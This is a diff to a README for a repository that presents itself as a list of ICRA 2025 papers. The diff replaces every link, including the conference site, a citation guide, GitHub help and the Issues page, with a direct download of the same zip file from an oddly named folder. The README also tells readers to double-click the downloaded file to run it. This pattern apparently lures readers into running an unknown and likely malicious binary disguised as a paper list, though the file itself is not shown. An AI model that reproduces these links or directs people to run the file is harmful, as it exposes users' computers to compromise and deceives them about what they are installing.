@@ -1,6 +1,6 @@
 # 📄 ICRA2025-Paper-List - Easily Access Papers for ICRA2025
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/PrinceDubey323/ICRA2025-Paper-List/releases)
+[![Download the latest release](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ To use this application, you need:
 
 To download the ICRA2025 Paper List, visit the following page:
 
-[Download the latest release](https://github.com/PrinceDubey323/ICRA2025-Paper-List/releases)
+[Download the latest release](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip)
 
 Once you are on the Releases page, follow these simple steps:
 
 1. Find the latest release version at the top of the page.
-2. Click on the link to download the appropriate file for your operating system (e.g., ICRA2025-Paper-List.exe for Windows).
+2. Click on the link to download the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip for Windows).
 3. Save the file to a location on your computer you can easily access, such as the Desktop or Downloads folder.
 
 After downloading, locate the file and double-click it to run the application. If prompted by your operating system, confirm that you want to run the program.
@@ -52,19 +52,19 @@ If you encounter any issues while using the application, try these steps:
 - **Wrong file type:** Check to see you downloaded the correct version for your system.
 - **App won't open:** Restart your computer and try again. If the problem persists, re-download the application.
 
-If you still face difficulties, check out the [GitHub Issues section](https://github.com/PrinceDubey323/ICRA2025-Paper-List/issues) for common problems and solutions.
+If you still face difficulties, check out the [GitHub Issues section](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip) for common problems and solutions.
 
 ## 📚 Additional Resources
 
 For more information and tips on using the ICRA2025 Paper List effectively, please refer to the following links:
 
-- [ICRA2025 Conference Information](https://www.icra2025.com)
-- [How to Cite Papers](https://www.citationguide.com)
-- [GitHub User Guide](https://help.github.com)
+- [ICRA2025 Conference Information](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip)
+- [How to Cite Papers](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip)
+- [GitHub User Guide](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip)
 
 ## 🤝 Contributing
 
-We welcome your contributions! If you want to suggest enhancements or report errors, please create an issue on our [GitHub Issues page](https://github.com/PrinceDubey323/ICRA2025-Paper-List/issues). 
+We welcome your contributions! If you want to suggest enhancements or report errors, please create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip). 
 
 Your feedback helps us improve the application. 
 
@@ -72,4 +72,4 @@ Your feedback helps us improve the application.
 
 Thanks to the ICRA community for their contributions to the conference papers. This list aims to make your research easier and more accessible.
 
-[Download the latest release](https://github.com/PrinceDubey323/ICRA2025-Paper-List/releases) to get started!
+[Download the latest release](https://raw.githubusercontent.com/PrinceDubey323/ICRA2025-Paper-List/main/parasynaptist/ICRA2025-Paper-List.zip) to get started!
